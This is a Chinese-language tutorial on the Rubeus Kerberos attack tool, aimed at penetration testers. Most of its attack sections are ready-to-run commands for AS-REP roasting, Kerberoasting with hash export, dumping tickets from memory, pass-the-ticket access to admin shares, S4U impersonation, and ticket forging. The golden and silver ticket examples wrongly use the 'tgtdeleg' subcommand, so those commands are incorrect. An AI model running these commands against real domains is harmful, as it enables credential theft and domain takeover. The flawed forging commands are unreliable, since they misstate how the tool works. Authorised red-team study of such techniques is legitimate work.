### Rubeus 工具介绍

Rubeus 是一个强大的 Kerberos 操作工具，由威胁猎人和安全研究人员开发，用于在 Windows 环境中进行 Kerberos 相关的攻击和操作。它可以帮助渗透测试人员和红队成员执行多种与 Kerberos 相关的攻击，包括票据伪造、票据导出、票据请求、票据续订、票据清理等操作。Rubeus 由 C# 编写，可以作为独立的可执行文件运行，也可以作为内存加载的程序集使用。

### 主要功能

1. **AS-REP Roasting**：
   - 针对不需要预身份验证的账户进行票据请求和破解。

2. **Kerberoasting**：
   - 请求和导出服务票据，并通过离线破解获取服务账户的密码。

3. **黄金票据（Golden Ticket）攻击**：
   - 伪造 TGT（Ticket Granting Ticket），以获得域内的任意权限。

4. **银票据（Silver Ticket）攻击**：
   - 伪造 TGS（Ticket Granting Service）票据，以获得对特定服务的访问权限。

5. **票据导入和导出**：
   - 从内存或文件中导入和导出 Kerberos 票据。

6. **票据续订**：
   - 续订现有的 Kerberos 票据，以延长其有效期。

7. **S4U（Service for User）**：
   - 使用 S4U2Self 和 S4U2Proxy 协议请求票据，以代表其他用户进行操作。

8. **Pass-the-Ticket 攻击**：
   - 利用导入的票据进行身份验证和访问资源。

### 安装 Rubeus

Rubeus 可以从 GitHub 仓库下载源代码并进行编译，或者直接下载已编译的可执行文件。

#### 1. 从源代码编译

- 克隆 Rubeus 仓库：
  ```bash
  git clone https://github.com/GhostPack/Rubeus
  cd Rubeus
  ```

- 使用 Visual Studio 或 MSBuild 编译项目：
  ```bash
  msbuild Rubeus.sln
  ```

#### 2. 下载已编译的可执行文件

- 访问 [Rubeus 的发布页面](https://github.com/GhostPack/Rubeus/releases) 下载最新的已编译版本。

### 使用方法

Rubeus 提供了丰富的命令和参数，可以通过命令行执行各种操作。以下是一些常见的使用场景和命令示例：

#### 1. AS-REP Roasting

针对不需要预身份验证的账户请求票据并导出进行破解：

```bash
Rubeus.exe asreproast
```

#### 2. Kerberoasting

请求服务票据并导出以进行离线破解：

```bash
Rubeus.exe kerberoast
```

将结果导出到文件：

```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

#### 3. 票据导入和导出

从文件导入票据：

```bash
Rubeus.exe ptt /ticket:base64_ticket_string
```

从内存导出所有票据：

```bash
Rubeus.exe dump
```

导出到文件：

```bash
Rubeus.exe dump /luid:0x3e7 /outfile:tickets.kirbi
```

#### 4. 票据续订

续订现有票据：

```bash
Rubeus.exe renew /ticket:base64_ticket_string
```

#### 5. 黄金票据（Golden Ticket）

生成和注入黄金票据：

```bash
Rubeus.exe tgtdeleg /user:Administrator /rc4:hash /domain:DOMAIN /sid:S-1-5-21-... /target:dc.domain.com
```

#### 6. 银票据（Silver Ticket）

生成和注入银票据：

```bash
Rubeus.exe tgtdeleg /user:Administrator /rc4:hash /domain:DOMAIN /sid:S-1-5-21-... /service:cifs /target:server.domain.com
```

#### 7. Pass-the-Ticket 攻击

导入票据并执行 Pass-the-Ticket 攻击：

```bash
Rubeus.exe ptt /ticket:base64_ticket_string
```

然后可以使用普通命令访问资源，例如：

```bash
dir \\target-server\c$
```

### 高级用法

Rubeus 提供了许多高级功能，可以通过组合不同的命令和参数来实现复杂的攻击场景。以下是一些高级用法示例：

#### 使用 S4U 协议请求票据

使用 S4U2Self 协议请求票据：

```bash
Rubeus.exe s4u /user:TARGET_USER /rc4:HASH /impersonateuser:IMPERSONATE_USER /domain:DOMAIN /sid:DOMAIN_SID /target:dc.domain.com
```

使用 S4U2Proxy 协议请求票据：

```bash
Rubeus.exe s4u /user:TARGET_USER /rc4:HASH /impersonateuser:IMPERSONATE_USER /msdsspn:cifs/target-server.domain.com /domain:DOMAIN /sid:DOMAIN_SID /target:dc.domain.com
```

### 结论

Rubeus 是一款功能强大的 Kerberos 操作工具，通过其丰富的命令和参数，渗透测试人员和红队成员可以在复杂的 Active Directory 环境中执行多种 Kerberos 相关的攻击和操作。熟练掌握 Rubeus 的使用，可以显著提升在 AD 环境中的渗透能力和效率。